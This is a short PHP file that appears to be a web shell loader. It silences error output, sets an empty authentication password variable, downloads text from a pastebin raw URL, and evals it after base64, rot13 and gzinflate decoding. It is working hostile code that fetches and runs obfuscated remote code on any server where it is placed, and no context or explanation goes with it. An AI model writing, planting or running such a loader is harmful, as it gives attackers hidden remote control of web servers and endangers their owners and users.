<?php
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$auth_pass = ""; 
$hythan= file_get_contents('http://pastebin.com/raw/Qu7ZKGeq');
eval(str_rot13(gzinflate(str_rot13(base64_decode(($hythan))))));
?>